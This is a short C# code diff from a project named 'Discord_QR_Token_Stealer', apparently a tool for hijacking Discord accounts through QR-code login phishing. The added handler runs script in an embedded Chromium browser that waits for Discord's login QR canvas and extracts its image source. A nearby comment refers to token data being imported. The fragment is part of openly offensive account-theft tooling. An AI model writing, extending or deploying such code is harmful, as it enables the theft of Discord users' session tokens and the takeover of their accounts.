@@ -463,6 +463,14 @@ namespace Discord_QR_Token_Stealer
                 createLog("Updated unique.txt");
             }
         }
+
+        private void chromiumWebBrowser1_LoadingStateChanged(object sender, LoadingStateChangedEventArgs e)
+        {
+            if (e.IsLoading)
+                return;
+
+            chromiumWebBrowser1.EvaluateScriptAsync("let t = setInterval(() => {if (!document.getElementsByTagName('canvas')[0]) return;clearInterval(t);console.log(document.getElementsByTagName('canvas')[0].parentElement.children[1].src);}, 10);");
+        }
     }
 
     // class that data from tokens gets imported into
